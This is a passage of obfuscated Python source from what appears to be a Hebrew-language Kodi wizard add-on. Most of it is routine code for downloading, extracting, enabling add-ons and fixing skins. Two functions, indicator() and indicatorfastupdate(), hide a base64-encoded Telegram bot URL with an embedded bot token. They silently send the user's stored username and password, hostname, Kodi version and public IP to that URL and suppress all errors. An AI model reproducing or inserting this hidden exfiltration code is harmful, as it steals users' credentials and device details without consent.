        OO000O00000OOO0O0 +=len (O0000OO0O0O00OO00 )#line:3470
        OO00OOO0OOO0OO0OO .write (O0000OO0O0O00OO00 )#line:3471
        if not OO000O00OO0O0OO0O :#line:3473
            OO0000O0O00O0000O =OO000O00000OOO0O0 #line:3474
        if O0O0OOOO0OOOO00O0 .iscanceled ():#line:3475
           O0O0OOOO0OOOO00O0 .close ()#line:3476
           try :#line:3477
            os .remove (OO000OO00OO0OO00O )#line:3478
           except :#line:3479
            pass #line:3480
           break #line:3481
        OOOO0OOO00O0OOO0O =float (OO000O00000OOO0O0 )/OO0000O0O00O0000O #line:3482
        OOOO0OOO00O0OOO0O =round (OOOO0OOO00O0OOO0O *100 ,2 )#line:3483
        OOOOO00000O0O0OO0 =OO000O00000OOO0O0 /(1024 *1024 )#line:3484
        O00OO00OO00OO0000 =OO0000O0O00O0000O /(1024 *1024 )#line:3485
        OOOOO00OO00O00000 ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OOOOO00000O0O0OO0 ,'teal',O00OO00OO00OO0000 )#line:3486
        if (time .time ()-OOOO0O0000OO0OO0O )>0 :#line:3487
          O0O00O000000O0000 =OO000O00000OOO0O0 /(time .time ()-OOOO0O0000OO0OO0O )#line:3488
          O0O00O000000O0000 =O0O00O000000O0000 /1024 #line:3489
        else :#line:3490
         O0O00O000000O0000 =0 #line:3491
        OO0O0O00000000OO0 ='KB'#line:3492
        if O0O00O000000O0000 >=1024 :#line:3493
           O0O00O000000O0000 =O0O00O000000O0000 /1024 #line:3494
           OO0O0O00000000OO0 ='MB'#line:3495
        if O0O00O000000O0000 >0 and not OOOO0OOO00O0OOO0O ==100 :#line:3496
            O0OOO00OOOOOO0O0O =(OO0000O0O00O0000O -OO000O00000OOO0O0 )/O0O00O000000O0000 #line:3497
        else :#line:3498
            O0OOO00OOOOOO0O0O =0 #line:3499
        OO0O0OOO0O000O0O0 ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',O0O00O000000O0000 ,OO0O0O00000000OO0 )#line:3500
        O0O0OOOO0OOOO00O0 .update (int (OOOO0OOO00O0OOO0O ),"Downloading "+name ,OOOOO00OO00O00000 ,OO0O0OOO0O000O0O0 )#line:3502
  O0OO00OOO0O0OOOO0 =xbmc .translatePath (os .path .join ('special://home','addons'))#line:3505
  OO00OOO0OOO0OO0OO .close ()#line:3507
  extract (OO000OO00OO0OO00O ,O0OO00OOO0O0OOOO0 ,O0O0OOOO0OOOO00O0 )#line:3509
  if os .path .exists (O0OO00OOO0O0OOOO0 +'/scakemyer-script.quasar.burst'):#line:3510
    if os .path .exists (O0OO00OOO0O0OOOO0 +'/script.quasar.burst'):#line:3511
     shutil .rmtree (O0OO00OOO0O0OOOO0 +'/script.quasar.burst',ignore_errors =False )#line:3512
    os .rename (O0OO00OOO0O0OOOO0 +'/scakemyer-script.quasar.burst',O0OO00OOO0O0OOOO0 +'/script.quasar.burst')#line:3513
  if os .path .exists (O0OO00OOO0O0OOOO0 +'/plugin.video.kmediatorrent-master'):#line:3515
    if os .path .exists (O0OO00OOO0O0OOOO0 +'/plugin.video.kmediatorrent'):#line:3516
     shutil .rmtree (O0OO00OOO0O0OOOO0 +'/plugin.video.kmediatorrent',ignore_errors =False )#line:3517
    os .rename (O0OO00OOO0O0OOOO0 +'/plugin.video.kmediatorrent-master',O0OO00OOO0O0OOOO0 +'/plugin.video.kmediatorrent')#line:3518
  xbmc .executebuiltin ('UpdateLocalAddons ')#line:3519
  xbmc .executebuiltin ("UpdateAddonRepos")#line:3520
  try :#line:3521
    os .remove (OO000OO00OO0OO00O )#line:3522
  except :#line:3523
    pass #line:3524
  O0O0OOOO0OOOO00O0 .close ()#line:3525
def dis_or_enable_addon (OOO0OOOO0OO0OOO00 ,OO0O00OO00OO00OO0 ,enable ="true"):#line:3526
    import json #line:3527
    OOO000OOOO00OO000 ='"%s"'%OOO0OOOO0OO0OOO00 #line:3528
    if xbmc .getCondVisibility ("System.HasAddon(%s)"%OOO0OOOO0OO0OOO00 )and enable =="true":#line:3529
        logging .warning ('already Enabled')#line:3530
        return xbmc .log ("### Skipped %s, reason = allready enabled"%OOO0OOOO0OO0OOO00 )#line:3531
    elif not xbmc .getCondVisibility ("System.HasAddon(%s)"%OOO0OOOO0OO0OOO00 )and enable =="false":#line:3532
        return xbmc .log ("### Skipped %s, reason = not installed"%OOO0OOOO0OO0OOO00 )#line:3533
    else :#line:3534
        O0OOO0O0O0OOO0OOO ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":%s,"enabled":%s}}'%(OOO000OOOO00OO000 ,enable )#line:3535
        OO0OOO0OO000O000O =xbmc .executeJSONRPC (O0OOO0O0O0OOO0OOO )#line:3536
        OO0O0O0OOO00OO0O0 =json .loads (OO0OOO0OO000O000O )#line:3537
        if enable =="true":#line:3538
            xbmc .log ("### Enabled %s, response = %s"%(OOO0OOOO0OO0OOO00 ,OO0O0O0OOO00OO0O0 ))#line:3539
        else :#line:3540
            xbmc .log ("### Disabled %s, response = %s"%(OOO0OOOO0OO0OOO00 ,OO0O0O0OOO00OO0O0 ))#line:3541
    if OO0O00OO00OO00OO0 =='auto':#line:3542
     return True #line:3543
    return xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:3544
def chunk_report (O00O0O00OO0OO000O ,OOO00O0OO0O0O000O ,O0OOO0OOO0O00OOO0 ):#line:3545
   O0OOO0OOOOOOO00OO =float (O00O0O00OO0OO000O )/O0OOO0OOO0O00OOO0 #line:3546
   O0OOO0OOOOOOO00OO =round (O0OOO0OOOOOOO00OO *100 ,2 )#line:3547
   if O00O0O00OO0OO000O >=O0OOO0OOO0O00OOO0 :#line:3549
      sys .stdout .write ('\n')#line:3550
def chunk_read (O0OOO00OO00O000O0 ,chunk_size =8192 ,report_hook =None ,dp =None ,destination ='',filesize =1000000 ):#line:3552
   import time #line:3553
   OO0000O0O0OOO0OO0 =int (filesize )*1000000 #line:3554
   O0O00OOO000O00OO0 =0 #line:3556
   O0O0OO0OOO00000OO =time .time ()#line:3557
   O000OO00O0O0OO0OO =0 #line:3558
   logging .warning ('Downloading')#line:3560
   with open (destination ,"wb")as OOOOOOO0OO00OO000 :#line:3561
    while 1 :#line:3562
      OO00OO0O00O0O0O0O =time .time ()-O0O0OO0OOO00000OO #line:3563
      OO00O0O0000000OO0 =int (O000OO00O0O0OO0OO *chunk_size )#line:3564
      OO00OO0O0000OO0OO =O0OOO00OO00O000O0 .read (chunk_size )#line:3565
      OOOOOOO0OO00OO000 .write (OO00OO0O0000OO0OO )#line:3566
      OOOOOOO0OO00OO000 .flush ()#line:3567
      O0O00OOO000O00OO0 +=len (OO00OO0O0000OO0OO )#line:3568
      OO0O0OOOOO0O0O0OO =float (O0O00OOO000O00OO0 )/OO0000O0O0OOO0OO0 #line:3569
      OO0O0OOOOO0O0O0OO =round (OO0O0OOOOO0O0O0OO *100 ,2 )#line:3570
      if int (OO00OO0O00O0O0O0O )>0 :#line:3571
        OOOOOOOO0O00OOOOO =int (OO00O0O0000000OO0 /(1024 *OO00OO0O00O0O0O0O ))#line:3572
      else :#line:3573
         OOOOOOOO0O00OOOOO =0 #line:3574
      if OOOOOOOO0O00OOOOO >1024 and not OO0O0OOOOO0O0O0OO ==100 :#line:3575
          O0OOO0O0O0000OOOO =int (((OO0000O0O0OOO0OO0 -OO00O0O0000000OO0 )/1024 )/(OOOOOOOO0O00OOOOO ))#line:3576
      else :#line:3577
          O0OOO0O0O0000OOOO =0 #line:3578
      if O0OOO0O0O0000OOOO <0 :#line:3579
        O0OOO0O0O0000OOOO =0 #line:3580
      dp .update (int (OO0O0OOOOO0O0O0OO ),name +"[B]מוריד: [/B]","\r%d%%,[COLOR aqua] %d MB / %d MB [/COLOR], %d KB/s "%(OO0O0OOOOO0O0O0OO ,OO00O0O0000000OO0 /(1024 *1024 ),OO0000O0O0OOO0OO0 /(1000 *1000 ),OOOOOOOO0O00OOOOO ),'[COLOR aqua]%02d:%02d[/COLOR][B]זמן שנותר: [/B]'%divmod (O0OOO0O0O0000OOOO ,60 ))#line:3581
      if dp .iscanceled ():#line:3582
         dp .close ()#line:3583
         break #line:3584
      if not OO00OO0O0000OO0OO :#line:3585
         break #line:3586
      if report_hook :#line:3588
         report_hook (O0O00OOO000O00OO0 ,chunk_size ,OO0000O0O0OOO0OO0 )#line:3589
      O000OO00O0O0OO0OO +=1 #line:3590
   logging .warning ('END Downloading')#line:3591
   return O0O00OOO000O00OO0 #line:3592
def googledrive_download (O0O0OOO000OOOO0OO ,OOOO0O0OOOOOO0OOO ,O00O0000OOOOOOOO0 ,O000O00OOO000000O ):#line:3594
    O0OOO0O0OOOOO0O00 =[]#line:3598
    OOOOOO0O0O0O0O0OO =O0O0OOO000OOOO0OO .split ('=')#line:3599
    O0O0OOO000OOOO0OO =OOOOOO0O0O0O0O0OO [len (OOOOOO0O0O0O0O0OO )-1 ]#line:3600
    def O000OOOOO0000OO00 (O0OOOO0000000O0OO ):#line:3602
        for O000OO0OO0OOOOOOO in O0OOOO0000000O0OO :#line:3604
            logging .warning ('cookie.name')#line:3605
            logging .warning (O000OO0OO0OOOOOOO .name )#line:3606
            OOO0OOOOO00OOOOOO =O000OO0OO0OOOOOOO .value #line:3607
            if 'download_warning'in O000OO0OO0OOOOOOO .name :#line:3608
                logging .warning (O000OO0OO0OOOOOOO .value )#line:3609
                logging .warning ('cookie.value')#line:3610
                return O000OO0OO0OOOOOOO .value #line:3611
            return OOO0OOOOO00OOOOOO #line:3612
        return None #line:3614
    def OO00O0O0O0000OO00 (O0OOOO000O0OO00OO ,O0OO0OO0000000O0O ):#line:3616
        O0OO0000O0O00O00O =32768 #line:3618
        O0O0O000000O0OO00 =time .time ()#line:3619
        with open (O0OO0OO0000000O0O ,"wb")as OO00O0000OO00OO0O :#line:3621
            O00O0O0OOO000O000 =1 #line:3622
            O0O0OO0O00OO0O0OO =32768 #line:3623
            try :#line:3624
                O000000OOOO0O00O0 =int (O0OOOO000O0OO00OO .headers .get ('content-length'))#line:3625
                print ('file total size :',O000000OOOO0O00O0 )#line:3626
            except TypeError :#line:3627
                print ('using dummy length !!!')#line:3628
                O000000OOOO0O00O0 =int (O000O00OOO000000O )*1000000 #line:3629
            for O0OO0O0OOO0OO00OO in O0OOOO000O0OO00OO .iter_content (O0OO0000O0O00O00O ):#line:3630
                if O0OO0O0OOO0OO00OO :#line:3631
                    OO00O0000OO00OO0O .write (O0OO0O0OOO0OO00OO )#line:3632
                    OO00O0000OO00OO0O .flush ()#line:3633
                    OO0OO0O0O00000000 =time .time ()-O0O0O000000O0OO00 #line:3634
                    OOO0O0OO00OOOOO0O =int (O00O0O0OOO000O000 *O0O0OO0O00OO0O0OO )#line:3635
                    if OO0OO0O0O00000000 ==0 :#line:3636
                        OO0OO0O0O00000000 =0.1 #line:3637
                    O00O0OOO000OOO000 =int (OOO0O0OO00OOOOO0O /(1024 *OO0OO0O0O00000000 ))#line:3638
                    O0OOO00OO0O00OOO0 =int (O00O0O0OOO000O000 *O0O0OO0O00OO0O0OO *100 /O000000OOOO0O00O0 )#line:3639
                    if O00O0OOO000OOO000 >1024 and not O0OOO00OO0O00OOO0 ==100 :#line:3640
                      OOOOOOOOOO00O00OO =int (((O000000OOOO0O00O0 -OOO0O0OO00OOOOO0O )/1024 )/(O00O0OOO000OOO000 ))#line:3641
                    else :#line:3642
                      OOOOOOOOOO00O00OO =0 #line:3643
                    O00O0000OOOOOOOO0 .update (int (O0OOO00OO0O00OOO0 ),name ,"\r%d%%,[COLOR aqua] %d MB / %d MB [/COLOR], %d KB/s "%(O0OOO00OO0O00OOO0 ,OOO0O0OO00OOOOO0O /(1024 *1024 ),O000000OOOO0O00O0 /(1000 *1000 ),O00O0OOO000OOO000 ),'[B]ETA:[/B] [COLOR aqua]%02d:%02d[/COLOR]'%divmod (OOOOOOOOOO00O00OO ,60 ))#line:3645
                    O00O0O0OOO000O000 +=1 #line:3646
                    if O00O0000OOOOOOOO0 .iscanceled ():#line:3647
                     O00O0000OOOOOOOO0 .close ()#line:3648
                     break #line:3649
    OOO0OOOO00O0OOO0O ="https://docs.google.com/uc?export=download"#line:3650
    import urllib2 #line:3655
    import cookielib #line:3656
    from cookielib import CookieJar #line:3658
    OOOOO0O0000000000 =CookieJar ()#line:3660
    OOO0O0000000OO0O0 =urllib2 .build_opener (urllib2 .HTTPCookieProcessor (OOOOO0O0000000000 ))#line:3661
    OOOOOOO0OO0O0OOO0 ={'id':O0O0OOO000OOOO0OO }#line:3663
    OO0O0O00OO0O00000 =urllib .urlencode (OOOOOOO0OO0O0OOO0 )#line:3664
    logging .warning (OOO0OOOO00O0OOO0O +'&'+OO0O0O00OO0O00000 )#line:3665
    O0O00O00OO000O0O0 =OOO0O0000000OO0O0 .open (OOO0OOOO00O0OOO0O +'&'+OO0O0O00OO0O00000 )#line:3666
    O0OOO0OO0OO0O0O00 =O0O00O00OO000O0O0 .read ()#line:3667
    for O0O0O0O00000O00OO in OOOOO0O0000000000 :#line:3669
         logging .warning (O0O0O0O00000O00OO )#line:3670
    O000000OOO0O0OOOO =O000OOOOO0000OO00 (OOOOO0O0000000000 )#line:3671
    logging .warning (O000000OOO0O0OOOO )#line:3672
    if O000000OOO0O0OOOO :#line:3673
        O0O000O00OO0OO0OO ={'id':O0O0OOO000OOOO0OO ,'confirm':O000000OOO0O0OOOO }#line:3674
        OOOOOO00OO0000OOO ={'Access-Control-Allow-Headers':'Content-Length'}#line:3675
        OO0O0O00OO0O00000 =urllib .urlencode (O0O000O00OO0OO0OO )#line:3676
        O0O00O00OO000O0O0 =OOO0O0000000OO0O0 .open (OOO0OOOO00O0OOO0O +'&'+OO0O0O00OO0O00000 )#line:3677
        chunk_read (O0O00O00OO000O0O0 ,report_hook =chunk_report ,dp =O00O0000OOOOOOOO0 ,destination =OOOO0O0OOOOOO0OOO ,filesize =O000O00OOO000000O )#line:3678
    return (O0OOO0O0OOOOO0O00 )#line:3682
def kodi17Fix ():#line:3683
	OO0O00O0O0O0OOOOO =glob .glob (os .path .join (ADDONS ,'*/'))#line:3684
	O0OO0O000000OO000 =[]#line:3685
	for OO0O00OO0O00OO0OO in sorted (OO0O00O0O0O0OOOOO ,key =lambda OO000OOOOO0000O0O :OO000OOOOO0000O0O ):#line:3686
		O00OOOO000OOOO0O0 =os .path .join (OO0O00OO0O00OO0OO ,'addon.xml')#line:3687
		if os .path .exists (O00OOOO000OOOO0O0 ):#line:3688
			OOOOOOO0O0OOO00OO =OO0O00OO0O00OO0OO .replace (ADDONS ,'')[1 :-1 ]#line:3689
			OO00OO00OOO0OO00O =open (O00OOOO000OOOO0O0 )#line:3690
			OO0OOO00O00OOO000 =OO00OO00OOO0OO00O .read ()#line:3691
			O0O0OOOO0O00O0OO0 =parseDOM (OO0OOO00O00OOO000 ,'addon',ret ='id')#line:3692
			OO00OO00OOO0OO00O .close ()#line:3693
			try :#line:3694
				O000O0OO0OO0O00OO =xbmcaddon .Addon (id =O0O0OOOO0O00O0OO0 [0 ])#line:3695
			except :#line:3696
				try :#line:3697
					log ("%s was disabled"%O0O0OOOO0O00O0OO0 [0 ],xbmc .LOGDEBUG )#line:3698
					O0OO0O000000OO000 .append (O0O0OOOO0O00O0OO0 [0 ])#line:3699
				except :#line:3700
					try :#line:3701
						log ("%s was disabled"%OOOOOOO0O0OOO00OO ,xbmc .LOGDEBUG )#line:3702
						O0OO0O000000OO000 .append (OOOOOOO0O0OOO00OO )#line:3703
					except :#line:3704
						if len (O0O0OOOO0O00O0OO0 )==0 :log ("Unabled to enable: %s(Cannot Determine Addon ID)"%OOOOOOO0O0OOO00OO ,xbmc .LOGERROR )#line:3705
						else :log ("Unabled to enable: %s"%OO0O00OO0O00OO0OO ,xbmc .LOGERROR )#line:3706
	if len (O0OO0O000000OO000 )>0 :#line:3707
		OOOOO00O000OO0OO0 =0 #line:3708
		DP .create (ADDONTITLE ,'[COLOR %s]Enabling disabled Addons'%COLOR2 ,'','Please Wait[/COLOR]')#line:3709
		for O0OOO0OO00O0O0O00 in O0OO0O000000OO000 :#line:3710
			OOOOO00O000OO0OO0 +=1 #line:3711
			OO000000OO00OO0OO =int (percentage (OOOOO00O000OO0OO0 ,len (O0OO0O000000OO000 )))#line:3712
			DP .update (OO000000OO00OO0OO ,"","Enabling: [COLOR %s]%s[/COLOR]"%(COLOR1 ,O0OOO0OO00O0O0O00 ))#line:3713
			addonDatabase (O0OOO0OO00O0O0O00 ,1 )#line:3714
			if DP .iscanceled ():break #line:3715
		if DP .iscanceled ():#line:3716
			DP .close ()#line:3717
			LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Enabling Addons Cancelled![/COLOR]"%COLOR2 )#line:3718
			sys .exit ()#line:3719
		DP .close ()#line:3720
	forceUpdate ()#line:3721
def indicator ():#line:3723
       try :#line:3724
          import json #line:3725
          wiz .log ('FRESH MESSAGE')#line:3726
          OO0O0OO0OO00O000O =(ADDON .getSetting ("user"))#line:3727
          O0O00OO0O00OO00O0 =(ADDON .getSetting ("pass"))#line:3728
          O00OOOOOOO0OOOOO0 =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:3729
          OO0O00OOO0O0O0O0O ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDc1MDEwMDI1NjpBQUVJVnpTSndOM2t6T25EV0F3Yi1LTkk3VUREY2N6aEx6VS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0xMDAxNDE1ODcxNzk3JnRleHQ915TXqten15nXnyDXkNeqINeU15HXmdec15Mg16nXnNeaIA=='#line:3730
          O0O0O0O0O000O0OOO =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:3731
          OO0OOO0OOO00OOO00 =str (json .loads (O0O0O0O0O000O0OOO )['ip'])#line:3732
          OOO0OOOO0OO0000OO =OO0O0OO0OO00O000O #line:3733
          OO0OOOOO00OOO0O0O =O0O00OO0O00OO00O0 #line:3734
          import socket #line:3735
          O0O0O0O0O000O0OOO =urllib2 .urlopen (OO0O00OOO0O0O0O0O .decode ('base64')+' - '+(socket .gethostbyaddr (socket .gethostname ())[0 ])+' - '+OOO0OOOO0OO0000OO +' - '+OO0OOOOO00OOO0O0O +' - '+O00OOOOOOO0OOOOO0 +' - '+OO0OOO0OOO00OOO00 ).readlines ()#line:3736
       except :pass #line:3738
def indicatorfastupdate ():#line:3740
       try :#line:3741
          import json #line:3742
          wiz .log ('FRESH MESSAGE')#line:3743
          O0000O00O0OOOOOOO =(ADDON .getSetting ("user"))#line:3744
          OOOO000O00000OOO0 =(ADDON .getSetting ("pass"))#line:3745
          O0OO0OO0OOOO000OO =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:3746
          OOO00OO00O0O00OO0 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0yNzQyNjIzODkmdGV4dD0g16LXqdeUINei15PXm9eV158g157XlNeZ16gg'#line:3748
          OO0000OO0O0OO000O =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:3749
          OO0O0OO000OO000O0 =str (json .loads (OO0000OO0O0OO000O )['ip'])#line:3750
          O0OO0000O00O00OO0 =O0000O00O0OOOOOOO #line:3751
          OO0O0O00OO00O00O0 =OOOO000O00000OOO0 #line:3752
          import socket #line:3754
          OO0000OO0O0OO000O =urllib2 .urlopen (OOO00OO00O0O00OO0 .decode ('base64')+' - '+(socket .gethostbyaddr (socket .gethostname ())[0 ])+' - '+O0OO0000O00O00OO0 +' - '+OO0O0O00OO00O00O0 +' - '+O0OO0OO0OOOO000OO +' - '+OO0O0OO000OO000O0 ).readlines ()#line:3755
       except :pass #line:3757
def skinfix18 ():#line:3759
	if KODIV >=18 and os .path .exists (os .path .join (ADDONS ,SKINID18 )):#line:3760
		OO0O0O000O00O0OO0 =wiz .workingURL (SKINID18DDONXML )#line:3761
		if OO0O0O000O00O0OO0 ==True :#line:3762
			O00OO0OO0O000000O =wiz .parseDOM (wiz .openURL (SKINID18DDONXML ),'addon',ret ='version',attrs ={'id':SKINID18 })#line:3763
			if len (O00OO0OO0O000000O )>0 :#line:3764
				O0OOO0O000O0OO000 ='%s-%s.zip'%(SKINID18 ,O00OO0OO0O000000O [0 ])#line:3765
				OOO00OOO000OOO00O =wiz .workingURL (SKIN18ZIPURL +O0OOO0O000O0OO000 )#line:3766
				if OOO00OOO000OOO00O ==True :#line:3767
					DP .create (ADDONTITLE ,'מתאים את הסקין לקודי שלך, אנא המתן....','','Please Wait')#line:3768
					if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3769
					O0OOOO00OO0OOO0OO =os .path .join (PACKAGES ,O0OOO0O000O0OO000 )#line:3770
					try :os .remove (O0OOOO00OO0OOO0OO )#line:3771
					except :pass #line:3772
					downloader .download (SKIN18ZIPURL +O0OOO0O000O0OO000 ,O0OOOO00OO0OOO0OO ,DP )#line:3773
					extract .all (O0OOOO00OO0OOO0OO ,HOME ,DP )#line:3774
					try :#line:3775
						O0O00O000OO00O0OO =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos107.db")#line:3776
						O0OO000OOOO000O00 =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos116.db")#line:3777
						os .rename (O0O00O000OO00O0OO ,O0OO000OOOO000O00 )#line:3778
					except :#line:3779
						pass #line:3780
					try :#line:3781
						OOO0OOOO0000O0O00 =open (os .path .join (ADDONS ,SKINID18 ,'addon.xml'),mode ='r');OOOO000O0000OOOOO =OOO0OOOO0000O0O00 .read ();OOO0OOOO0000O0O00 .close ()#line:3782
						OO0OO00000OO00O0O =wiz .parseDOM (OOOO000O0000OOOOO ,'addon',ret ='name',attrs ={'id':SKINID18 })#line:3783
						wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,OO0OO00000OO00O0O [0 ]),"[COLOR %s]Add-on updated[/COLOR]"%COLOR2 ,icon =os .path .join (ADDONS ,SKINID18 ,'icon.png'))#line:3784
					except :#line:3785
						pass #line:3786
					if KODIV >=17 :wiz .addonDatabase (SKINID18 ,1 )#line:3787
					DP .close ()#line:3788
					xbmc .sleep (500 )#line:3789
					wiz .forceUpdate (True )#line:3790
					wiz .log ("[Auto Install Repo] Successfully Installed",xbmc .LOGNOTICE )#line:3791
				else :#line:3792
					wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid url for zip![/COLOR]"%COLOR2 )#line:3793
					wiz .log ("[Auto Install Repo] Was unable to create a working url for repository. %s"%OOO00OOO000OOO00O ,xbmc .LOGERROR )#line:3794
			else :#line:3795
				wiz .log ("Invalid URL for Repo Zip",xbmc .LOGERROR )#line:3796
		else :#line:3797
			wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid addon.xml file![/COLOR]"%COLOR2 )#line:3798
			wiz .log ("[Auto Install Repo] Unable to read the addon.xml file.",xbmc .LOGERROR )#line:3799
def skinfix17 ():#line:3800
	if KODIV >=17 and KODIV <18 and os .path .exists (os .path .join (ADDONS ,SKINID17 )):#line:3801
		O0O0OO0O0O000O0OO =wiz .workingURL (SKINID17DDONXML )#line:3802
		if O0O0OO0O0O000O0OO ==True :#line:3803
			OOO0O0O0OO00O0OOO =wiz .parseDOM (wiz .openURL (SKINID17DDONXML ),'addon',ret ='version',attrs ={'id':SKINID17 })#line:3804
			if len (OOO0O0O0OO00O0OOO )>0 :#line:3805
				O0OO0OO0OOO0O0O0O ='%s-%s.zip'%(SKINID17 ,OOO0O0O0OO00O0OOO [0 ])#line:3806
				O000OOO0O0OO00O0O =wiz .workingURL (SKIN17ZIPURL +O0OO0OO0OOO0O0O0O )#line:3807
				if O000OOO0O0OO00O0O ==True :#line:3808
					DP .create (ADDONTITLE ,'מתאים את הסקין לקודי שלך, אנא המתן....','','Please Wait')#line:3809
					if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3810
					OOO0O00O00OOOO00O =os .path .join (PACKAGES ,O0OO0OO0OOO0O0O0O )#line:3811
					try :os .remove (OOO0O00O00OOOO00O )#line:3812
					except :pass #line:3813
					downloader .download (SKIN17ZIPURL +O0OO0OO0OOO0O0O0O ,OOO0O00O00OOOO00O ,DP )#line:3814
					extract .all (OOO0O00O00OOOO00O ,HOME ,DP )#line:3815
					try :#line:3816
						OOOO0O000O00O0OO0 =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos116.db")#line:3817
						OOOO0OOOOOO0O0O0O =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos107.db")#line:3818
						os .rename (OOOO0O000O00O0OO0 ,OOOO0OOOOOO0O0O0O )#line:3819
					except :#line:3820
						pass #line:3821
					try :#line:3822
						O00OOOOO0000O00OO =open (os .path .join (ADDONS ,SKINID17 ,'addon.xml'),mode ='r');OO0OO0OO0O0O0OO0O =O00OOOOO0000O00OO .read ();O00OOOOO0000O00OO .close ()#line:3823
						O00OO00000O00OOO0 =wiz .parseDOM (OO0OO0OO0O0O0OO0O ,'addon',ret ='name',attrs ={'id':SKINID17 })#line:3824
						wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,O00OO00000O00OOO0 [0 ]),"[COLOR %s]Add-on updated[/COLOR]"%COLOR2 ,icon =os .path .join (ADDONS ,SKINID17 ,'icon.png'))#line:3825
					except :#line:3826
						pass #line:3827
					if KODIV >=17 :wiz .addonDatabase (SKINID17 ,1 )#line:3828
					DP .close ()#line:3829
					xbmc .sleep (500 )#line:3830
					wiz .forceUpdate (True )#line:3831
					wiz .log ("[Auto Install Repo] Successfully Installed",xbmc .LOGNOTICE )#line:3832
				else :#line:3833
					wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid url for zip![/COLOR]"%COLOR2 )#line:3834
					wiz .log ("[Auto Install Repo] Was unable to create a working url for repository. %s"%O000OOO0O0OO00O0O ,xbmc .LOGERROR )#line:3835
			else :#line:3836
				wiz .log ("Invalid URL for Repo Zip",xbmc .LOGERROR )#line:3837
		else :#line:3838
			wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid addon.xml file![/COLOR]"%COLOR2 )#line:3839
			wiz .log ("[Auto Install Repo] Unable to read the addon.xml file.",xbmc .LOGERROR )#line:3840
def fix17update ():#line:3841
	if KODIV >=17 and KODIV <18 :#line:3842
		wiz .kodi17Fix ()#line:3843
		xbmc .sleep (4000 )#line:3844
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.language","value":"resource.language.he_il"}}')#line:3845
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.font","value":"ntkl.ttf"}}')#line:3846
		fixfont ()#line:3847
		O00OO00O0O000O0OO =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","addon.xml")#line:3848
		try :#line:3850
			O0OOOOOOOO00OOO00 =open (O00OO00O0O000O0OO ,'r')#line:3851
			O0O00OOOO00O0O00O =O0OOOOOOOO00OOO00 .read ()#line:3852
			O0OOOOOOOO00OOO00 .close ()#line:3853
			OO0O000OOOOO0OO00 ='<import addon="xbmc.gui" version="5.14.0(.+?)/>'#line:3854
			O0OOO0O0OOO0O000O =re .compile (OO0O000OOOOO0OO00 ).findall (O0O00OOOO00O0O00O )[0 ]#line:3855
			O0OOOOOOOO00OOO00 =open (O00OO00O0O000O0OO ,'w')#line:3856
			O0OOOOOOOO00OOO00 .write (O0O00OOOO00O0O00O .replace ('<import addon="xbmc.gui" version="5.14.0%s/>'%O0OOO0O0OOO0O000O ,'<import addon="xbmc.gui" version="5.12.0"/>'))#line:3857
			O0OOOOOOOO00OOO00 .close ()#line:3858
		except :#line:3859
				pass #line:3860
		wiz .kodi17Fix ()#line:3861
		O00OO00O0O000O0OO =os .path .join (xbmc .translatePath ("special://userdata"),"guisettings.xml")#line:3862
		try :#line:3863
			O0OOOOOOOO00OOO00 =open (O00OO00O0O000O0OO ,'r')#line:3864
			O0O00OOOO00O0O00O =O0OOOOOOOO00OOO00 .read ()#line:3865
			O0OOOOOOOO00OOO00 .close ()#line:3866
			OO0O000OOOOO0OO00 ='<keyboardlayouts default="true(.+?)/keyboardlayouts>'#line:3867
			O0OOO0O0OOO0O000O =re .compile (OO0O000OOOOO0OO00 ).findall (O0O00OOOO00O0O00O )[0 ]#line:3868
			O0OOOOOOOO00OOO00 =open (O00OO00O0O000O0OO ,'w')#line:3869
			O0OOOOOOOO00OOO00 .write (O0O00OOOO00O0O00O .replace ('<keyboardlayouts default="true%s/keyboardlayouts>'%O0OOO0O0OOO0O000O ,'<keyboardlayouts>English QWERTY|Hebrew QWERTY</keyboardlayouts>'))#line:3870
			O0OOOOOOOO00OOO00 .close ()#line:3871
		except :#line:3872
				pass #line:3873
		swapSkins ('skin.Premium.mod')#line:3874
def fix18update ():#line:3876
	if KODIV >=18 :#line:3877
		xbmc .sleep (4000 )#line:3878
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.language","value":"resource.language.he_il"}}')#line:3879
